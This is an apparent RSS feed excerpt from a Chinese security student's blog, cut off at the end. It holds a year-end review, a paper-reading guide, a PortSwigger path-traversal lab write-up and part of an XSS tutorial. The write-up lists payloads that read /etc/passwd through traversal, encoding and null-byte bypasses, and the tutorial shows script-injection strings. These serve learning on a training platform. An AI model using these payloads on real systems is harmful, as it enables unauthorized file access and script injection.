的基本套路</li><li>读书，这学期意识到了<strong>软实力</strong>的重要性，不能一味研究技术，跟人说话都说不来了<del>，主要是为了搭讪</del>。<ol><li>《线上幽灵：克里·米特尼克自传》，大佬，无敌</li><li>《图解密码技术》看完没总结，忘完了</li><li>《魔鬼搭讪学》，就。。。图一乐？</li><li>《杀死一只知更鸟》</li><li>《the art of ChatGPT Prompting: A Guide to Crafting Clear and Effective Prompts》 写的依托答辩，三十来页 pdf，算一个小册子</li><li>《Bug Bounty Playbook》。这本看了信息收集部分，<strong>神中神</strong>，看完马上就有了信息收集的思路，之前一味调研工具确实有点浪费时间</li></ol></li><li>ChatGPT &amp; prompt engineering <ol><li>今年 ChatGPT 一炮炸响，但我直到十一月才用上 GPT4，前面用过一些其他的GPT，不过都不尽如人意，如 Bing 等各种乱七八糟的网站</li><li>看了吴恩达的 prompt engineering 课程：deeplearning.ai ChatGPT Prompt Engineering for Developers，<strong>还没总结</strong>，懒癌快晚期了。</li><li>自主在 github 上搜了很多 GPT 以及 prompt 方面的内容，还没消化完</li></ol></li><li>开始注重每天摄入信息的质量，知乎、小红书纯纯浪费时间<ol><li>使用 Feedly 订阅了很多博客，大部分都是英文，不过质量很高</li><li>形成并优化自己的信息流和学习流程<ol><li>信息摄取：feedly, x (twitter), youtube </li><li>信息收藏：cubox，notion 操作起来真是太复杂了，现在我用 notion 记录一些渗透的 checklist 和中间结果</li><li>记录+总结：obsidian 使用坚果云和百度网盘同步空间同步</li><li>pdf资料（书&#x2F;论文）：ipad marginnote3 <strong>ps:</strong> 自从买了平板之后看书时间明显变长了，都给我卷起来！</li></ol></li></ol></li><li>PortSwigger web academy。虽然这些都是基础，实战基本用不到，汶飞师哥也说有个印象就行，我还是打算抽点时间把这些基础 lab 都做一下，更多的是掌握思想，而且很多时候说和做是两码事 emmmm<ol><li>把这两百多个 lab 做完，然后照着师哥说的思路学习，目前进度：72&#x2F;264</li><li><strong>争取下学期开学前搞完</strong></li></ol></li><li>重新开始折腾 archlinux<ol><li>原因：懒得在各种设备上配环境，魔霸7p又太重了，只好拿出已经退役小半年的骚粉小新14了。老年轻薄本只能跑跑 linux了。</li><li>一直寻思着给自己整一个渗透测试工具箱，直到看到了 blackarch </li><li>当然，还有很多东西等待我去折腾。</li></ol></li><li>开始自己编写脚本。不得不说 ChatGPT 真是写脚本的好帮手，我也能为开源做点贡献啦。<ol><li>ob2hexo：将 obsidian 仓库中的文章一键发布到 hexo，现在还是半成品，只能进行基础的发布操作，现在有很多改进思路了</li></ol></li><li>健身也没有落下哦，跟着胤哥练了两周，学习了很多，胤哥的训练容量是真的大，之后由于时间关系没法跟胤哥一块练了，但我还在照着胤哥的计划练，这学期体重减了 2 kg 左右，胸围还增了 4 cm（101 了），进步还是有的。更新：隔了一个月又量了一下，98，裂开，估计是上次量的时候动作摆得太开了….</li></ol><h1 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h1><ol><li>今年最大的成长就是<strong>面对英文资料不再害怕</strong>了，这之后就发现中文资料的质量其实远远比不上英文的 emmm <ol><li>现在遇到什么问题，大多时候都是直接搜英文资料。</li><li>跟 ChatGPT 聊天我也都用英文，就是不知道这样能不能稍稍提高一下 回答的质量。</li><li>甚至开始读英文书了</li></ol></li><li>另一个成长就是知道了 github 的牛逼之处，现在有事没事就去浏览一下 github，也确实发现了很多有意思有用的项目。</li><li>开始浏览国内外大佬的挖洞姿势，开始看 hackerone activity 的漏洞报告以及订阅的其他博客的挖洞经验分享，但我现在基础有点差，很多博客即使看了很长时间也看不懂 emmm</li><li><del>md，</del>（我不会再说脏话了）有太多想干的事啦，多发五分钟的呆都是罪恶</li></ol><h1 id="直男尴尬语录"><a href="#直男尴尬语录" class="headerlink" title="直男尴尬语录"></a>直男尴尬语录</h1><p>没解释的就是满满的不堪回首的尬。</p><ol><li>有不带薪的假期嘛？<ol><li>刚开学的时候老师给我们开了个会，据他的描述，这个会的意义是：把丑话说到前头，明确注意事项。当时好像有一条是学生暑假享有一周的带薪假期，这条给我整懵了，研究生暑假只能休息一周，还是说其实还有不带薪的假期？然后举手示意，问了老师这句话，现在想想多少有点不尊重老师，呜呜。</li></ol></li><li>沙河下的人不多。</li><li>我喜欢吃陈醋。</li><li>中裤？中分裤！</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/%E7%A2%8E%E7%AC%94%E7%9A%84%E9%9A%8F/">碎笔的随</category>
      
      
      <comments>https://by-musi.github.io/2024/02/11/2023_%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>读论文的“三步走”战略  HowtoReadaPaper</title>
      <link>https://by-musi.github.io/2024/02/11/%E8%AF%BB%E8%AE%BA%E6%96%87%E7%9A%84%E2%80%9C%E4%B8%89%E6%AD%A5%E8%B5%B0%E2%80%9D%E6%88%98%E7%95%A5__HowtoReadaPaper/</link>
      <guid>https://by-musi.github.io/2024/02/11/%E8%AF%BB%E8%AE%BA%E6%96%87%E7%9A%84%E2%80%9C%E4%B8%89%E6%AD%A5%E8%B5%B0%E2%80%9D%E6%88%98%E7%95%A5__HowtoReadaPaper/</guid>
      <pubDate>Sat, 10 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>当代大学生，尤其是我这样的研究牲，每天需要阅读很多文献&#x2F;文章，但如何快速拿捏一篇文献呢？相信本文会给你答案（我真是越来越老道了，虽然但是，我的梦想是当颜值博主！）</p><p>真实的阅读论文三步法，首先看文献标题，“How to Read a Paper”，简单易懂，没啥说的，确认过眼神，不是“母猪的产后护理”，文献应该没找错；其次看眼作者，滑铁卢大学，没听过呀，google 一下作者，剑桥大学！这下这篇文章不得不看了；最后看下页数，2页？！，舒服了。最最后，关闭文献，打开B站，享受生活。文献？狗都不看(doge)。</p><p>下面介绍这篇文章以及 “虚假的” 文献阅读 “三步走” 战略。</p><h1 id="1-三句话概括"><a href="#1-三句话概括" class="headerlink" title="1 三句话概括"></a>1 三句话概括</h1><ol><li>本文介绍了一个高效阅读科研论文的方法 – three-pass。</li><li>第一遍看个大概，解决方法部分只看标题与小标题；第二遍看图表；第三遍，坐牢。</li><li>介绍了一些调研陌生科研领域时找论文的方法。</li></ol><h1 id="2-作者简介"><a href="#2-作者简介" class="headerlink" title="2 作者简介"></a>2 作者简介</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/11/Pasted_image_20231120105455.png" data-caption=""><img src="/images/2024/02/11/Pasted_image_20231120105455.png"></a><br><a href="https://svr-sk818-web.cl.cam.ac.uk/keshav/wiki/index.php/Main_Page">Srinivasan Keshav</a> 剑桥大学计算机科学与技术系 Robert Sansom 计算机科学教授，之前研究计算机网络，现在好像去保护环境了？</p><h1 id="3-读论文的“三步走”战略"><a href="#3-读论文的“三步走”战略" class="headerlink" title="3 读论文的“三步走”战略"></a>3 读论文的“三步走”战略</h1><blockquote><p>概述<br>The first pass gives you a <strong>general idea</strong> about the paper. The second pass lets you grasp the paper’s content, <strong>but not its details</strong>. The third pass helps you <strong>understand the paper in depth</strong>.</p></blockquote><h2 id="the-first-pass-快速扫描，鸟瞰全文"><a href="#the-first-pass-快速扫描，鸟瞰全文" class="headerlink" title="the first pass - 快速扫描，鸟瞰全文"></a>the first pass - 快速扫描，鸟瞰全文</h2><p>第一遍读论文时，可以快速浏览整篇文章，也就是文中说的 bird’s-eye view，以抓住文章的 main idea 为主。读完第一遍后，我们应该就摸清这篇论文啥水平了(shen&#x2F;shit)，同时也能知道它是否具有进一步阅读 (second and third pass) 的价值。</p><p>一般<strong>10分钟</strong>左右。（我这种菜鸡也就个把小时吧）</p><h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><ol><li>仔细阅读文章标题、摘要和简介部分 (the title, abstract, and introduction)</li><li>读 section 和 sub-section 的标题，忽略其他</li><li>读结论</li><li>浏览一下参考文献，可以写写画画，勾一下你已经读过的文献</li></ol><h3 id="侧重点"><a href="#侧重点" class="headerlink" title="侧重点"></a>侧重点</h3><p>读完第一遍之后，我们应该能够回答一下问题：</p><ol><li>Category：这篇文章是什么类型？</li><li>Context：有哪些相关文章，解决该问题有哪些相关理论？</li><li>Correctness：文中的假设是否有效？</li><li>Contributions：本文主要贡献？</li><li>Clarity：这篇文章写得是否条理清晰</li></ol><h2 id="the-second-pass-关注要点，忽略细节"><a href="#the-second-pass-关注要点，忽略细节" class="headerlink" title="the second pass - 关注要点，忽略细节"></a>the second pass - 关注要点，忽略细节</h2><p>第二遍读论文可以读的稍微细一点，但是不用太关注太多细节，比如证明过程。看完第二遍，我们就能够抓住本文的主旨和主要思路了，甚至能将该论文讲给其他人了。</p><p>一般花个 <strong>1 小时</strong>。（这么说我只用花一天时间就能抓住要点了？）</p><h3 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h3><ol><li>仔细看图标，抓住要点</li><li>标记一下没看过的参考文献，为下一篇文章做准备（一入__深似海</li></ol><h2 id="the-third-pass-复现"><a href="#the-third-pass-复现" class="headerlink" title="the third pass - 复现"></a>the third pass - 复现</h2><p>第三遍读论文的时候要完全理解本篇文章，包括证明过程中的细节。</p><p>初学者<strong>4-5h</strong>，有经验的 <strong>1h 左右</strong>。（太棒了！我只需要一周就能完全理解一篇论文了）</p><h3 id="具体步骤-2"><a href="#具体步骤-2" class="headerlink" title="具体步骤"></a>具体步骤</h3><blockquote><p>the key to the third pass：<br>making the same assumptions as the authors, re-create the work</p></blockquote><p>在脑子里做相同的假设，重新做一遍文章中的工作(<strong>virtually re-implement</strong>)。要注意所有的细节与假设。</p><h3 id="侧重点-1"><a href="#侧重点-1" class="headerlink" title="侧重点"></a>侧重点</h3><p>读完第三遍之后，我们要做到以下几点：</p><ol><li>能自己在脑海中构建本文的整个思路框架，并判断其优缺点</li><li>能指出隐含的假设，未引用的相关研究以及实验和分析方法中的潜在问题</li><li>有无改进思路</li></ol><h1 id="4-找论文–快速调研某个领域"><a href="#4-找论文–快速调研某个领域" class="headerlink" title="4 找论文–快速调研某个领域"></a>4 找论文–快速调研某个领域</h1><p>上文介绍了如何读论文，但是我们研究牲要读大量论文，有时候需要调研一些我们不熟悉的研究方向&#x2F;领域。那我们如何<strong>查找相关论文</strong>来快速了解我们不熟悉的领域呢？</p><ol><li>使用<strong>学术搜索引擎</strong>搜索论文，如 Google Scholar, CiteSeer <ol><li>找三五篇该领域下最新的论文</li><li>尤其关注该领域的<strong>调研论文或综述论文</strong></li></ol></li><li>找高引用的文章或出现较多的作者<ol><li>尤其关注顶会，以下是网络安全四大顶会<ol><li>IEEE Symposium on Security and Privacy</li><li>Usenix Security Symposium </li><li>ACM Conference on Computer and Communications Security</li><li>Symposium on Network and Distributed System Security</li></ol></li></ol></li><li>直接在<strong>顶会</strong>上找最新报告&#x2F;论文</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/">论文精读</category>
      
      
      <comments>https://by-musi.github.io/2024/02/11/%E8%AF%BB%E8%AE%BA%E6%96%87%E7%9A%84%E2%80%9C%E4%B8%89%E6%AD%A5%E8%B5%B0%E2%80%9D%E6%88%98%E7%95%A5__HowtoReadaPaper/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PortSwigger path-traversal labs</title>
      <link>https://by-musi.github.io/2023/12/26/PortSwigger_path-traversal_labs/</link>
      <guid>https://by-musi.github.io/2023/12/26/PortSwigger_path-traversal_labs/</guid>
      <pubDate>Mon, 25 Dec 2023 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-Lab-File-path-traversal-simple-case"><a href="#1-Lab-File-path-traversal-simple-case" class="headerlink" title="1 Lab: File path traversal, simple case"></a>1 Lab: File path traversal, simple case</h1><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206223726.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206223726.png"></a></p><p>网页使用 GET 请求获取图片。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/image?filename=5.jpg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>linux 系统网站的 base directory 是 <code>/var/www/images</code>，使用目录穿越，构造 payload <code>../../../etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206224857.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206224857.png"></a></p><p>Lab 解决，由于 <code>&lt;img&gt;</code> 标签限制，无法展示出 <code>/etc/passwd</code> 文件的内容。</p><p>为了方便展示，使用 burp 抓包，发送到 Repeater，修改 filename。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206224112.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206224112.png"></a></p><p>得到的响应报文如下：</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><p>可以看到已经拿到了 <code>/etc/passwd</code> 的内容。</p><h1 id="2-Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><a href="#2-Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass" class="headerlink" title="2 Lab: File path traversal, traversal sequences blocked with absolute path bypass"></a>2 Lab: File path traversal, traversal sequences blocked with absolute path bypass</h1><p>同样，使用 burp 抓包，正常的图片请求如下：</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206225530.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206225530.png"></a></p><p>构造 filename：<code>../../../etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206225841.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206225841.png"></a></p><p>可能是网站对 filename 进行了过滤。</p><p>使用<strong>绝对路径</strong>绕过。</p><p>发送 filename&#x3D;<code>/etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206230039.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206230039.png"></a></p><p>成功。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><hr><blockquote><p>[!question] 问题<br>服务端没有回显对 filename 的解析结果，如何选择合适的绕过方式？</p><p>答：只能一个一个试，或者用字典<strong>爆破</strong>吧</p></blockquote><hr><h1 id="3-Lab-File-path-traversal-traversal-sequences-stripped-non-recursively"><a href="#3-Lab-File-path-traversal-traversal-sequences-stripped-non-recursively" class="headerlink" title="3 Lab: File path traversal, traversal sequences stripped non-recursively"></a>3 Lab: File path traversal, traversal sequences stripped non-recursively</h1><p>burp 抓包，构造 filename，<code>....//..././..././etc/passwd</code> 类似于双写绕过，后端的逻辑可能是仅将 <code>../</code> 替换为 空。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206233022.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206233022.png"></a></p><p>拿到 <code>/etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><h1 id="4-Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode"><a href="#4-Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode" class="headerlink" title="4 Lab: File path traversal, traversal sequences stripped with superfluous URL-decode"></a>4 Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h1><p>抓包，burp 重放，构造 <code>filename=../../../etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207221030.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207221030.png"></a></p><p>响应也不出意外的是 “No such file”。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207221118.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207221118.png"></a></p><p>使用<strong>双重 URL 编码</strong>绕过，构造 payload : <code>filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd</code></p><p>推荐一个编码工具，<a href="https://gchq.github.io/CyberChef/">CyberChef</a></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208092614.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208092614.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222326.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222326.png"></a></p><p>成功访问 <code>/etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><h1 id="5-Lab-File-path-traversal-validation-of-start-of-path"><a href="#5-Lab-File-path-traversal-validation-of-start-of-path" class="headerlink" title="5 Lab: File path traversal, validation of start of path"></a>5 Lab: File path traversal, validation of start of path</h1><p>burp 抓包，可以看到文件以 <code>/var/www/images/</code> 开头，后端可能会判断文件的前几个目录来判断其有效性。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208085758.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208085758.png"></a></p><p>构造文件名 <code>filename=../../../etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208090410.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208090410.png"></a></p><p>得到的响应如下：</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208090427.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208090427.png"></a></p><p>构造文件名 <code>filename=/var/www/images/../../../etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208090119.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208090119.png"></a></p><p>成功绕过。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><h1 id="6-Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass"><a href="#6-Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass" class="headerlink" title="6 Lab: File path traversal, validation of file extension with null byte bypass"></a>6 Lab: File path traversal, validation of file extension with null byte bypass</h1><p>构造文件名：<code>filename=../../../etc/passwd%00.jpg</code>。因为这个 lab 是通过验证文件扩展名来验证其有效性，所以我们以 <code>.jpg</code> 结尾，但我们想要访问的文件并不含有 <code>.jpg</code>，这里使用空字节 <code>%00</code> 截断。</p><p><code>.jpg</code> 绕过验证，在解析文件名时只解析 <code>%00</code> 前的部分。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208093928.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208093928.png"></a></p><p>成功拿到 <code>/etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/path-traversal/">path-traversal</category>
      
      <category domain="https://by-musi.github.io/tags/writeup/">writeup</category>
      
      
      <comments>https://by-musi.github.io/2023/12/26/PortSwigger_path-traversal_labs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>XSS基础介绍</title>
      <link>https://by-musi.github.io/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</link>
      <guid>https://by-musi.github.io/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</guid>
      <pubDate>Tue, 19 Dec 2023 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-什么是-XSS"><a href="#1-什么是-XSS" class="headerlink" title="1 什么是 XSS"></a>1 什么是 XSS</h1><p>XSS, 跨站脚本漏洞，英文全称 Cross Site Script，是一种能够让黑客通过“<strong>HTML 注入</strong>”篡改网页，向其中插入<strong>恶意脚本</strong>（一般为 JS 代码），从而在用户浏览网页时，控制用户浏览器的安全威胁，也是一种类型的注入漏洞。</p><p>在一开始，利用 XSS 进行攻击的演示案例是跨域的，所以叫做“跨站脚本”，不过现在 JavaScript 的功能日益强大、网站前端也愈发复杂，是否跨域也已不重要了。</p><h1 id="2-XSS-原理"><a href="#2-XSS-原理" class="headerlink" title="2 XSS 原理"></a>2 XSS 原理</h1><p>原理，或者说过程，如图所示。<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231127232816.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231127232816.png"></a></p><h2 id="XSS-发生的条件"><a href="#XSS-发生的条件" class="headerlink" title="XSS 发生的条件"></a>XSS 发生的条件</h2><ol><li>输入 web 应用程序的数据来自一个不可靠的源，一般是 web 请求。</li><li>包含恶意代码数据未经过滤就发送给 Web 用户。</li></ol><h1 id="3-XSS-类型"><a href="#3-XSS-类型" class="headerlink" title="3 XSS 类型"></a>3 XSS 类型</h1><h2 id="3-1-Reflected-XSS"><a href="#3-1-Reflected-XSS" class="headerlink" title="3.1 Reflected XSS"></a>3.1 Reflected XSS</h2><p>Reflected XSS 即<strong>反射型 XSS</strong>。当应用接收到HTTP请求中的数据，并把数据以一种不安全的方式，如不加任何处理，简单“反射”回浏览器（<strong>the immediate response</strong>）时，就会产生反射型 XSS 漏洞。</p><p>Reflected XSS 往往需要用户点击一个恶意链接才能攻击成功，且具有一次性，所以又叫 “<strong>非持久型</strong>” XSS。</p><p>Reflected XSS 通常出现在网站的<strong>搜索栏</strong>等地方，且恶意脚本代码通常来自于**当前的 HTTP 请求 (the current HTTP request)**。</p><h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>下面以 PortSwigger XSS labs 中的一个<a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">简单例子</a>进行说明。</p><p>该 lab 使用 GET 方法通过 search 参数传输数据，且对用户输入的数据不加任何处理就直接输出到页面上。</p><p>若用户提交如下数据，“search&#x3D;1655452184”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url: web-security-academy.net/?search=1655452184</span><br></pre></td></tr></table></figure><p>得到的结果如图所示：<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231126200835.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231126200835.png"></a></p><p>查看页面源码，有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>0 search results for &#x27;1655452184&#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果输入如下数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122232249.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122232249.png"></a></p><p>发现 js 脚本 <code>alert(/xss/)</code> 成功执行。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122232332.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122232332.png"></a></p><p>再次查看网页代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">&quot;0 search results for &#x27;&#x27;&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&#x27;&#x27;&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-Stored-XSS"><a href="#3-2-Stored-XSS" class="headerlink" title="3.2 Stored XSS"></a>3.2 Stored XSS</h2><p>Stored XSS 即<strong>存储型</strong> XSS，常常出现在<strong>论坛、博客、留言板</strong>等位置，攻击者在发帖过程中嵌入 XSS 攻击代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发恶意代码。所以 Stored XSS 的恶意脚本代码通常来自于<strong>网站服务端的数据库</strong>。</p><p>也正是因为恶意代码被存储在服务端数据库中，所以 Stored XSS 不需要用户单击特定 URL 就能执行跨站脚本，且能存在更长时间，又称为“<strong>持久型 XSS</strong>”。</p><h3 id="举个栗子-1"><a href="#举个栗子-1" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>下面以 PortSwigger XSS labs 中的一个 <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded">lab</a> 进行说明。</p><p>用户发布评论时，web 应用使用 POST 方法传输表单数据到服务端。</p><p>下图是发布评论时的报文：<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128210656.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128210656.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128210637.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128210637.png"></a></p><p>服务端未对用户评论内容进行处理就存储在了数据库中，当用户访问网页时，数据库中的内容发送到客户端并展示。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233548.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233548.png"></a></p><p>在评论中嵌入恶意代码：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233735.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233735.png"></a></p><p>由于恶意代码被当作评论存储在了服务端，所以我们不论什么时候访问评论区被嵌入恶意代码的博客，均会触发 XSS (<strong>持久型 XSS</strong>)</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233822.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233822.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233857.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233857.png"></a></p><h2 id="3-3-DOM-based-XSS"><a href="#3-3-DOM-based-XSS" class="headerlink" title="3.3 DOM-based XSS"></a>3.3 DOM-based XSS</h2><p>DOM-based XSS，是通过修改<strong>页面的 DOM 节点</strong>形成的 XSS。当 web 应用从攻击者可控的不受信任的来源中读取数据，并将它传入<strong>动态</strong>修改页面 <strong>DOM 节点</strong>的javascript 语句时就换产生 DOM-based XSS 漏洞。</p><p>这些 javascript 语句被称为 <strong>sink</strong>，如 <code>eval()</code>, <code>innerHTML</code>, <code>window.location</code> 等。</p><p>以下列出一些可能包含 DOM-XSS 漏洞的 sink。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span> </span><br><span class="line">element.<span class="property">innerHTML</span> </span><br><span class="line">element.<span class="property">outerHTML</span> </span><br><span class="line">element.<span class="property">insertAdjacentHTML</span> </span><br><span class="line">element.<span class="property">onevent</span></span><br></pre></td></tr></table></figure><h3 id="举个栗子-2"><a href="#举个栗子-2" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>以 PortSwigger XSS 实验中的 <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink">lab</a> 为例：</p><p>用户在搜索栏输入数据，web 应用使用 javascript 代码动态修改页面。</p><p>根据题目要求，<code>ctrl+shift+f</code> 全局搜索 <code>location.search</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135504.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135504.png"></a></p><p>函数 <code>trackSearch()</code> 使用 <code>document.write</code> 在上下两个 section 中写入一个 <code>&lt;img&gt;</code> 标签。<code>location.search</code> 从 url <code>https://0ae0002203c0668a84176d2100500026.web-security-academy.net/?search=1655452184</code>中拿到参数 <code>search</code> 的值并赋值给 <code>query</code>。   GET 方法</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135020.png" data-caption=""><img 